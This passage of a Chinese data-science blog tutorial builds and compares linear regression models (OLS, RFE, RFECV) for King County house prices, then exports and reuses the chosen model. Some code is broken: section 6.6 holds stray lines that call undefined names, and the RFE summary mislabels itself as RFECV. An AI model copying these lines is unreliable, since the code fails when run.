<h4 id="邮政编码伪变量"><a href="#邮政编码伪变量" class="headerlink" title="邮政编码伪变量"></a>邮政编码伪变量</h4><p>“Zipcode Dummy Variables”是指将邮政编码作为虚拟变量来表示。由于邮政编码不是一种有序值，将其作为虚拟变量可以更好地表示其在模型中的影响。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ziplist = pd.Series(kc_df[<span class="string">&quot;zipcode&quot;</span>]) <span class="comment">#make dummy columns</span></span><br><span class="line">kc_df = kc_df.merge(pd.get_dummies(ziplist), left_index=<span class="literal">True</span>, right_index=<span class="literal">True</span>) <span class="comment">#merge dummy columns</span></span><br></pre></td></tr></table></figure>

<h4 id="方形卧室和浴室。"><a href="#方形卧室和浴室。" class="headerlink" title="方形卧室和浴室。"></a>方形卧室和浴室。</h4><p>“Squared Bedrooms”和”Squared Bathrooms”特征的创建是为了增强它们与价格之间的相关性。由于卧室数量和浴室数量与房价高度相关，通过对它们的值进行平方操作，可以增加它们在线性模型中的影响力。这将减少0和1对线性模型的影响。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kc_df[<span class="string">&quot;bedroom_squared&quot;</span>] = kc_df[<span class="string">&quot;bedrooms&quot;</span>] ** <span class="number">2</span></span><br><span class="line">kc_df[<span class="string">&quot;bathroom_squared&quot;</span>] = kc_df[<span class="string">&quot;bathrooms&quot;</span>] ** <span class="number">2</span></span><br></pre></td></tr></table></figure>

<h3 id="4-线性回归模型选择"><a href="#4-线性回归模型选择" class="headerlink" title="4.线性回归模型选择"></a>4.线性回归模型选择</h3><h4 id="4-1训练以及测试数据集"><a href="#4-1训练以及测试数据集" class="headerlink" title="4.1训练以及测试数据集"></a>4.1训练以及测试数据集</h4><p><strong>概述：</strong><br>在该步骤中准备训练集以及测试集，将原始数据集划分为训练集和测试集，并确保两者之间的数据是相互独立的、没有重叠的。<br>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">features = [col <span class="keyword">for</span> col <span class="keyword">in</span> kc_df.columns <span class="keyword">if</span> col <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;id&quot;</span>, <span class="string">&quot;date&quot;</span>, <span class="string">&quot;price&quot;</span>] ] <span class="comment">#remove id, date, and price column from features</span></span><br><span class="line">lr_kc_df = kc_df[features] <span class="comment">#set train/test data using feature above</span></span><br><span class="line">model_target = kc_df[<span class="string">&quot;price&quot;</span>] <span class="comment">#target column is the price column</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(lr_kc_df, model_target ,test_size=<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>

<h4 id="4-2多元线性回归模型"><a href="#4-2多元线性回归模型" class="headerlink" title="4.2多元线性回归模型"></a>4.2多元线性回归模型</h4><p><strong>概述：</strong><br>该模型将作为所有其他模型的基线比较。该模型利用了一些基本特征和经过特征工程处理的特征。调整后的R-squared值为0.738，这意味着模型可以解释因变量约73.8%的变异程度。较高的R-squared值表示模型对数据的拟合较好，但并不代表模型一定是最佳模型，因为R-squared无法告诉我们关于模型中其他因素。</p>
<p><strong>代码解析：</strong><br>使用statsmodels库中的ols函数来拟合一个多元线性回归模型，并计算模型在训练集上的预测结果和均方根误差（RMSE）。<br>在这段代码中，定义了一个包含多个自变量的回归模型，其中自变量包括’sqft_living’（居住面积）、’C(zipcode)’（邮政编码，使用了虚拟变量表示）、’condition’（房屋条件）、’renovation_age’（翻新年龄）、’sale_year’（售出年份，使用了虚拟变量表示）、’C(sale_quarter)’（销售季度，使用了虚拟变量表示）、’C(basement)’（地下室，使用了虚拟变量表示）、’bedroom_squared’（卧室数量的平方）和’bathroom_squared’（浴室数量的平方）。</p>
<p>接下来，使用这个模型在训练集上进行预测，并计算了预测结果与实际值之间的均方根误差（RMSE）。</p>
<p>最后调用kc_ols.summary()来获取模型的详细统计结果。该方法会输出模型的摘要信息，包括回归系数、标准误差、t统计量、p值等。通过查看这些统计结果，以此了解模型的拟合效果、各个自变量的显著性以及模型的解释能力等信息。</p>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">eq = <span class="string">&quot;price~sqft_living+C(zipcode)+condition+renovation_age+sale_year+C(sale_quarter)+C(basement)+bedroom_squared+bathroom_squared&quot;</span></span><br><span class="line">kc_ols = smf.ols(formula=eq, data=kc_df).fit()</span><br><span class="line"><span class="comment"># uncomment below for summary of the ols model</span></span><br><span class="line"><span class="comment"># print(kc_ols.summary())</span></span><br><span class="line">ols_result = kc_ols.predict(x_train)</span><br><span class="line">ols_rmse = np.sqrt(metrics.mean_squared_error(y_train, ols_result))</span><br><span class="line">kc_ols.summary()</span><br></pre></td></tr></table></figure>
<p>部分输出结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345972.png" alt="image.png"></p>
<h4 id="4-3Scikit-learn库中的线性回归模型"><a href="#4-3Scikit-learn库中的线性回归模型" class="headerlink" title="4.3Scikit-learn库中的线性回归模型"></a>4.3Scikit-learn库中的线性回归模型</h4><p><strong>概述：</strong><br>使用Scikit-learn库中的线性回归模型，可以建立一个基本的线性回归模型，使用数据集中的所有特征进行训练和预测。</p>
<p><strong>代码解析：</strong><br>首先使用Scikit-learn库中的LinearRegression()函数创建一个线性回归模型lm_kc，并使用训练数据x_train和对应的目标变量y_train进行了模型的训练。</p>
<p>接下来，使用训练好的模型对训练数据x_test进行预测，得到了预测值y_train_prediction。</p>
<p>然后，通过计算均方根误差（RMSE）来评估模型在测试数据上的性能。RMSE是衡量模型预测误差的指标，表示预测值与实际值之间的平均差异。</p>
<p>最后，使用list(zip(lr_kc_df.columns, lm_kc.coef_))这一行代码来查看模型的系数。通过这行代码，可以得到一个由特征列名和对应的系数值组成的列表，用于查看模型对各个特征的权重影响。</p>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fit model</span></span><br><span class="line">lm_kc = LinearRegression().fit(x_train, y_train)</span><br><span class="line"><span class="comment">#training data prediction</span></span><br><span class="line">y_train_prediction = lm_kc.predict(x_test)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rmse</span></span><br><span class="line">train_rmse = np.sqrt(metrics.mean_squared_error(y_test, y_train_prediction))</span><br><span class="line"></span><br><span class="line"><span class="comment">#coeffeicient checking</span></span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">zip</span>(lr_kc_df.columns,lm_kc.coef_))</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345973.png" alt="image.png"><br><strong>总结：</strong><br>根据上述信息，可以看出这个模型在预测中高度依赖房产的邮政编码，同时减少了卧室数量、浴室数量和居住面积等房产的其他方面对房价的影响。在实际应用中，这种影响效果可能非常明显，导致该模型预测大多数房产的价格为负数。</p>
<h4 id="4-4递归特征消除"><a href="#4-4递归特征消除" class="headerlink" title="4.4递归特征消除"></a>4.4递归特征消除</h4><p><strong>概述：</strong><br>使用递归特征消除（Recursive Feature Elimination）方法来消除不必要的特征。通过这个方法，线性回归模型在每一次迭代中会剔除对模型预测性能贡献较小的特征。理论上，这个方法应该能够提供更准确的模型。</p>
<p><strong>代码解析：</strong><br>使用递归特征消除（RFE）方法来对特征进行排名和选择。</p>
<p>首先，使用RFE函数创建一个RFE对象，其中指定估计器（estimator）为线性回归模型（LinearRegression()），并设置步长（step）为1。然后，使用x_train和y_train作为训练数据来拟合RFE模型。</p>
<p>接下来，通过将特征名称和对应的特征排名组成的数据框（kc_rfe_ranking）打印出来，可以可视化特征的排名情况。数据框中的”Model Features”列包含特征的名称，”Feature Ranking”列包含每个特征的排名。</p>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kc_rfe = RFE(estimator=LinearRegression(), step=<span class="number">1</span>)</span><br><span class="line">kc_rfe = kc_rfe.fit(x_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run this cell to visualize how the feature are ranked</span></span><br><span class="line">kc_rfe_ranking = pd.DataFrame(&#123;<span class="string">&quot;Model Features&quot;</span>:x_train.columns, <span class="string">&quot;Feature Ranking&quot;</span>:kc_rfe.ranking_&#125;)</span><br><span class="line">rank_check = kc_rfe_ranking.sort_values(by=<span class="string">&quot;Feature Ranking&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(rank_check)</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345974.png" alt="image.png"></p>
<p><strong>代码解析：</strong><br>首先使用RFE对象的transform方法将训练数据x_train进行特征选择，得到经过特征选择后的训练数据x_train_rfe和测试数据x_test_rfe。</p>
<p>接下来，使用经过特征选择后的训练数据x_train_rfe和对应的目标变量y_train，创建一个新的线性回归模型lm_kc_rfe，并进行模型的训练。</p>
<p>然后，使用训练好的模型lm_kc_rfe对测试数据x_test_rfe进行预测，得到了预测值y_train_prediction_rfe。</p>
<p>最后，通过计算均方根误差（RMSE）来评估经过特征选择后模型在测试数据上的性能。使用np.sqrt(metrics.mean_squared_error(y_test, y_train_prediction_rfe))计算了模型在测试数据上的均方根误差。</p>
<p>lm_kc_rfe.coef_这一行代码输出了经过特征选择后的线性回归模型lm_kc_rfe的系数。通过这个系数，可以查看经过特征选择后，每个特征对于模型的影响程度。</p>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x_train_rfe = kc_rfe.transform(x_train)</span><br><span class="line">x_test_rfe = kc_rfe.transform(x_test)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fit model</span></span><br><span class="line">lm_kc_rfe = LinearRegression().fit(x_train_rfe, y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment">#training data prediction</span></span><br><span class="line">y_train_prediction_rfe = lm_kc_rfe.predict(x_test_rfe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rmse</span></span><br><span class="line">train_rmse_rfe = np.sqrt(metrics.mean_squared_error(y_test, y_train_prediction_rfe))</span><br><span class="line">lm_kc_rfe.coef_</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345975.png" alt="image.png"><br><strong>总结：</strong><br>可以看出经过递归特征消除交叉验证（RFECV）的模型系数异常地高。这些系数无法与特征名称轻松对应，但是大多数特征的单位变化会导致数百万甚至数千万美元的价格变化。这也解释了在数据集稍微变化时，该模型的不稳定行为。总结来说，可以预测这个模型是高度不现实的。</p>
<h4 id="4-5交叉验证的递归特征消除"><a href="#4-5交叉验证的递归特征消除" class="headerlink" title="4.5交叉验证的递归特征消除"></a>4.5交叉验证的递归特征消除</h4><p><strong>概述：</strong><br>通过使用交叉验证的方式进行特征选择，这个模型会花费更多的时间来完成。理论上，这个模型应该是最准确的模型，但实际结果显示，这个模型在某些情况下虽然准确，但也表现不稳定。这种不稳定的行为可以通过下面的模型系数来解释。</p>
<p><strong>代码解析：</strong><br>首先创建一个RFECV对象kc_rfecv，其中指定估计器（estimator）为线性回归模型（LinearRegression()），步长（step）为1，交叉验证的折数（cv）为5，评估指标（scoring）为负的均方根误差（neg_root_mean_squared_error），并使用所有可用的处理器（n_jobs&#x3D;-1）进行并行计算。然后，使用x_train和y_train作为训练数据来拟合RFECV模型。</p>
<p>接下来，使用RFECV对象的transform方法将训练数据x_train进行特征选择，得到经过特征选择后的训练数据x_train_rfecv和测试数据x_test_rfecv。</p>
<p>然后，使用经过特征选择后的训练数据x_train_rfecv和对应的目标变量y_train，创建一个新的线性回归模型lm_kc_rfecv，并进行模型的训练。</p>
<p>然后，使用训练好的模型lm_kc_rfecv对测试数据x_test_rfecv进行预测，得到了预测值y_train_prediction_rfecv。</p>
<p>最后，通过计算均方根误差（RMSE）来评估经过特征选择后模型在测试数据上的性能。使用np.sqrt(metrics.mean_squared_error(y_test, y_train_prediction_rfecv))计算了模型在测试数据上的均方根误差。</p>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kc_rfecv = RFECV(estimator=LinearRegression(), step=<span class="number">1</span>, cv=<span class="number">5</span>,</span><br><span class="line">                 scoring=<span class="string">&quot;neg_root_mean_squared_error&quot;</span>, n_jobs=-<span class="number">1</span>)</span><br><span class="line">kc_rfecv = kc_rfecv.fit(x_train, y_train)</span><br><span class="line"></span><br><span class="line">x_train_rfecv = kc_rfecv.transform(x_train)</span><br><span class="line">x_test_rfecv = kc_rfecv.transform(x_test)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fit model</span></span><br><span class="line">lm_kc_rfecv = LinearRegression().fit(x_train_rfecv, y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment">#training data prediction</span></span><br><span class="line">y_train_prediction_rfecv = lm_kc_rfecv.predict(x_test_rfecv)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rmse</span></span><br><span class="line">train_rmse_rfecv = np.sqrt(metrics.mean_squared_error(y_test, y_train_prediction_rfecv))</span><br><span class="line"></span><br><span class="line">lm_kc_rfecv.coef_</span><br></pre></td></tr></table></figure>

<p>输出结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345976.png" alt="image.png"></p>
<p><strong>总结：</strong><br>RFECV模型的系数看起来异常地高。这些系数无法与特征名称轻松对应，但大多数特征的单位变化会导致数百万甚至数千万美元的价格变化。这也解释了在数据集稍微变化时，该模型的不稳定行为。总结来说，可以预测这个模型也是高度不现实的。</p>
<h4 id="4-6模型对比与选择"><a href="#4-6模型对比与选择" class="headerlink" title="4.6模型对比与选择"></a>4.6模型对比与选择</h4><p>通过以下代码，输出上述不同模型在训练数据上的均方根误差。通过这些误差，可以比较不同模型的性能，了解它们在训练数据上的预测精度。较低的均方根误差表示模型的预测结果与实际值之间的误差较小，预测性能较好。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;OLS Model Errors&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Root Mean Squared Error:&quot;</span>, ols_rmse)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Basic Linear Regression Model Errors&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Root Mean Squared Error:&quot;</span>, train_rmse)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Linear Regression Model with Recursive Feature Elimination Errors&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Root Mean Squared Error:&#x27;</span> , train_rmse_rfe)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Linear Regression Model with Recursive Feature Elimination with Cross Validation Errors&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Root Mean Squared Error:&quot;</span> , train_rmse_rfecv)</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>OLS Model Errors Root Mean Squared Error: 189818.9783572206 </code></p>
<p><code>Basic Linear Regression Model Errors Root Mean Squared Error: 157757.42505386463</code></p>
<p><code>Linear Regression Model with Recursive Feature Elimination Errors Root Mean Squared Error: 206293.18835843043 </code></p>
<p><code>Linear Regression Model with Recursive Feature Elimination with Cross Validation Errors Root Mean Squared Error: 158517.33695024686</code></p>
<p><strong>结论：</strong><br>综上，Basic Linear Regression model的均方根误差在所有模型中最低。然而，RMSE并不是模型的全貌。当对各模型的系数进行分析时，观察到以下情况：<br>-基本线性模型在负预测中出现偏斜<br>-RFE线性模型系数表现出最佳平衡。<br>-RFECV线性模型系数异常高，大多数都高于目标值。<br>因此，选择RFE线性回归模型作为最终模型。</p>
<h3 id="5-模型导出"><a href="#5-模型导出" class="headerlink" title="5.模型导出"></a>5.模型导出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;models/regression_model_rfe.pickle&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> model:</span><br><span class="line">    pickle.dump(lm_kc_rfe, model)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;models/transform_rfe.pickle&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> transform:</span><br><span class="line">    pickle.dump(kc_rfe, transform)</span><br><span class="line"></span><br><span class="line">ziplist.to_csv(<span class="string">&quot;data/zipcod_dummy.csv&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="6-预测（模型的使用）"><a href="#6-预测（模型的使用）" class="headerlink" title="6.预测（模型的使用）"></a>6.预测（模型的使用）</h3><h4 id="6-1导入库"><a href="#6-1导入库" class="headerlink" title="6.1导入库"></a>6.1导入库</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">pd.options.display.max_columns = <span class="number">500</span></span><br><span class="line">pd.options.display.max_rows = <span class="number">500</span></span><br></pre></td></tr></table></figure>

<h4 id="6-2导入测试集"><a href="#6-2导入测试集" class="headerlink" title="6.2导入测试集"></a>6.2导入测试集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kc_import_df = pd.read_csv(<span class="string">&quot;data/kc_house_data_test_features.csv&quot;</span>, index_col=<span class="number">0</span>)</span><br><span class="line">kc_test_df = kc_import_df <span class="comment">#this is done not to adulterate the original file</span></span><br><span class="line">kc_test_df.head()</span><br></pre></td></tr></table></figure>

<p>部分测试集：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345977.png" alt="image.png"></p>
<h4 id="6-3-邮政编码伪变量导入"><a href="#6-3-邮政编码伪变量导入" class="headerlink" title="6.3 邮政编码伪变量导入"></a>6.3 邮政编码伪变量导入</h4><p>注意：<br>导入的数据集应与线性模型相匹配</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ziplist = pd.read_csv(<span class="string">&quot;data/zipcod_dummy.csv&quot;</span>, index_col=<span class="number">0</span>)</span><br><span class="line">ziplist = ziplist.zipcode</span><br><span class="line">ziplist.head()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345978.png" alt="image.png"></p>
<h4 id="6-4特征工程"><a href="#6-4特征工程" class="headerlink" title="6.4特征工程"></a>6.4特征工程</h4><p>相当于<strong>3.特征工程（Feature Engineering）</strong></p>
<p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#renovation</span></span><br><span class="line">kc_test_df[<span class="string">&quot;renovated&quot;</span>] = kc_test_df.yr_renovated.apply(<span class="keyword">lambda</span> x: <span class="number">1</span> <span class="keyword">if</span> x &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">kc_test_df[<span class="string">&quot;renovation_age&quot;</span>] = kc_test_df.yr_renovated.apply(<span class="keyword">lambda</span> x: <span class="number">2020</span>-x <span class="keyword">if</span> x &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#basement</span></span><br><span class="line">kc_test_df[<span class="string">&quot;basement&quot;</span>] = kc_test_df.sqft_basement.apply(<span class="keyword">lambda</span> x: <span class="number">1</span> <span class="keyword">if</span> x != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#master bathroom</span></span><br><span class="line">kc_test_df[<span class="string">&quot;master_bathroom&quot;</span>] = kc_test_df.bathrooms.apply(<span class="keyword">lambda</span> x: <span class="number">1</span> <span class="keyword">if</span> x &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#family house</span></span><br><span class="line">kc_test_df[<span class="string">&quot;family_house&quot;</span>] = kc_test_df.bedrooms.apply(<span class="keyword">lambda</span> x: <span class="number">1</span> <span class="keyword">if</span> x &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sold year and quarter</span></span><br><span class="line">kc_test_df[<span class="string">&quot;sale_year&quot;</span>] = kc_test_df.date.apply(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[:<span class="number">4</span>]))</span><br><span class="line">kc_test_df[<span class="string">&quot;sale_quarter&quot;</span>] = kc_test_df.date.apply(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="number">4</span>:<span class="number">6</span>])//<span class="number">3.1</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#zipcode dummy variables</span></span><br><span class="line">kc_test_df = kc_test_df.merge(pd.get_dummies(ziplist), left_index=<span class="literal">True</span>, right_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#squared bedrooms and bathrooms</span></span><br><span class="line">kc_test_df[<span class="string">&quot;bedroom_squared&quot;</span>] = kc_test_df[<span class="string">&quot;bedrooms&quot;</span>] ** <span class="number">2</span></span><br><span class="line">kc_test_df[<span class="string">&quot;bathroom_squared&quot;</span>] = kc_test_df[<span class="string">&quot;bathrooms&quot;</span>] ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uncomment to check the data set</span></span><br><span class="line"><span class="comment"># kc_test_df.head()</span></span><br><span class="line"></span><br><span class="line">features = [col <span class="keyword">for</span> col <span class="keyword">in</span> kc_test_df.columns <span class="keyword">if</span> col <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;id&quot;</span>, <span class="string">&quot;date&quot;</span>] ] <span class="comment">#remove unused column</span></span><br><span class="line"></span><br><span class="line">kc_test_df_features = kc_test_df[features] <span class="comment">#set train/test data using feature above</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kc_test_df_features.head()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345979.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kc_test_df_features.describe()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345980.png" alt="image.png"></p>
<h4 id="6-5导入模型与预测价格"><a href="#6-5导入模型与预测价格" class="headerlink" title="6.5导入模型与预测价格"></a>6.5导入模型与预测价格</h4><p><strong>导入模型：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;models/regression_model_rfe.pickle&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> model:</span><br><span class="line">    lr_model_rfe = pickle.load(model)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;models/transform_rfe.pickle&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> transform:</span><br><span class="line">    rfe_transform = pickle.load(transform)</span><br></pre></td></tr></table></figure>
<p><strong>根据RFECV变换特征：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rfe_features = rfe_transform.transform(kc_test_df_features)</span><br></pre></td></tr></table></figure>
<p><strong>房价预测：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kc_price_predict_rfe = lr_model_rfe.predict(rfe_features)</span><br><span class="line">price_prediction_rfe = pd.DataFrame(&#123;<span class="string">&quot;price&quot;</span>:kc_price_predict_rfe&#125;)</span><br><span class="line">price_prediction_rfe.describe()</span><br></pre></td></tr></table></figure>
<p><strong>预测结果：</strong><br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345981.png" alt="image.png"></p>
<h4 id="6-6预测结果合并与导出"><a href="#6-6预测结果合并与导出" class="headerlink" title="6.6预测结果合并与导出"></a>6.6预测结果合并与导出</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">selectedfeatures = []</span><br><span class="line">final_model.predict(holdout[sele])</span><br><span class="line">kc_import_df = kc_import_df.merge(price_prediction_rfe, left_index=<span class="literal">True</span>, right_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#reset columns for export</span></span><br><span class="line">kc_import_df = kc_import_df[[<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;price&#x27;</span>, <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;bedrooms&#x27;</span>, <span class="string">&#x27;bathrooms&#x27;</span>, <span class="string">&#x27;sqft_living&#x27;</span>,<span class="string">&#x27;sqft_lot&#x27;</span>, <span class="string">&#x27;floors&#x27;</span>, <span class="string">&#x27;waterfront&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;condition&#x27;</span>, <span class="string">&#x27;grade&#x27;</span>,<span class="string">&#x27;sqft_above&#x27;</span>, <span class="string">&#x27;sqft_basement&#x27;</span>, <span class="string">&#x27;yr_built&#x27;</span>,<span class="string">&#x27;yr_renovated&#x27;</span>,<span class="string">&#x27;zipcode&#x27;</span>,<span class="string">&#x27;lat&#x27;</span>,<span class="string">&#x27;long&#x27;</span>,<span class="string">&#x27;sqft_living15&#x27;</span>, <span class="string">&#x27;sqft_lot15&#x27;</span>]]</span><br><span class="line">kc_import_df.to_csv(<span 